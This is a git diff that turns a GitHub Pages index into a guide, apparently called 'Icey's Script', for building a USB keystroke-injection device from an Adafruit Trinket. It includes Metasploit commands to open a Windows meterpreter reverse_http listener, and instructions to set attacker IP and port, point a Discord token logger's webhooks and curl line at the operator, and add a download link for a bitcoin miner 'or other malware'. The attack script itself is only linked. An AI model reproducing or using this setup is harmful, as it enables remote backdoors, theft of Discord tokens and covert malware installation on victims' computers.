@@ -1,37 +1,39 @@
-## Welcome to GitHub Pages
+## Icey's Script
 
-You can use the [editor on GitHub](https://github.com/IceyScript/iceyscript/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+[The Best USB Rubber Ducky Solution]
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+The first thing you will need is the device =roughly $40 cheaper then a real ducky= [Adafruti Trinket](https://www.adafruit.com/product/1501)
 
-### Markdown
+Secondly You Will Need The Trinket Keyboard Library Found [Here] (https://learn.adafruit.com/pro-trinket-keyboard/library)
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+Now, you need the IDE found here [IDE] (https://learn.adafruit.com/introducing-pro-trinket/setting-up-arduino-ide)
 
-```markdown
-Syntax highlighted code block
+Lastly, you need the [script] (https://pastebin.com/raw/wdZ0axP5)
 
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
+Now, once you have the script in your IDE, you need to make a few edits:
+Make a Backdoor in Metasploit with these commands
 ```
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_http
+set LHOST YOUR-IP-HERE
+set LPORT YOUR-PORT-HERE
+run -j
+```
+After that is done, put your ip and port in the ATTACKER_IP section and port in the ATTACKER_PORT section.
+Once that is done, change the discord webhook two lines after the "Discord Token LoggerIpTimeName" comment and the webhook at the end of the line that starts with Curl
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+Now, change the download link under "Bitcoin Miner" to your own direct download link to a miner/other malware
 
-### Jekyll Themes
+You can also add more exploits yourself with the same format as the others
+Once done, plug your device into your PC, make sure it is in 
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/IceyScript/iceyscript/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+Once all of this is done, you must do a few more things to upload the script to the device
+First: Select the Pro Trinket 5V/16MHz (USB) or Pro Trinket 3V/12MHz (USB) board from the Tools->Board menu
+Second: Go into the Tools -> Programmer menu and select the USBtinyISP programmer
+Third: Plug in the Trinket, make sure you see the green LED lit (power good) and the red LED pulsing. Press the button if the red LED is not pulsing, to get into bootloader mode.
 
-### Support or Contact
+Click the Upload button (or select File->Upload)
 
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+And that’s it! You’re ready to plug in the device. When you plug the device in, once the red flashing indicator has stopped the device has started executing the code.
+
+Enjoy! and remember: only use this on PC's you have permission to use it on
